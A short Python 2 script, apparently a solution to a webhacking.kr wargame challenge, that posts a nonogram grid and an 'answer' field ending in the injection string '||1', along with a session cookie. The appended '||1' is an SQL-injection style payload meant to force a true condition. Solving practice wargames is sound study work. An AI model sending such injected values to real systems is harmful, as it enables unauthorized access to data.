import requests

url ="http://webhacking.kr/challenge/web/web-03/index.php"

headers = {
	"Cookie":"oldzombie=1;PHPSESSID=ce7d7b3317819f9f01951a6263279e37",
	"Host":"webhacking.kr"
}

params = {
"id":"1",
"_1":"1",
"_2":"0",
"_3":"1",
"_4":"0",
"_5":"1",
"_6":"0",
"_7":"0",
"_8":"0",
"_9":"0",
"_10":"0",
"_11":"0",
"_12":"1",
"_13":"1",
"_14":"1",
"_15":"0",
"_16":"0",
"_17":"1",
"_18":"0",
"_19":"1",
"_20":"0",
"_21":"1",
"_22":"1",
"_23":"1",
"_24":"1",
"_25":"1",
"answer":"1010100000011100101011111||1"
}

req = requests.post(url, headers=headers, data=params)
res = req.content

print res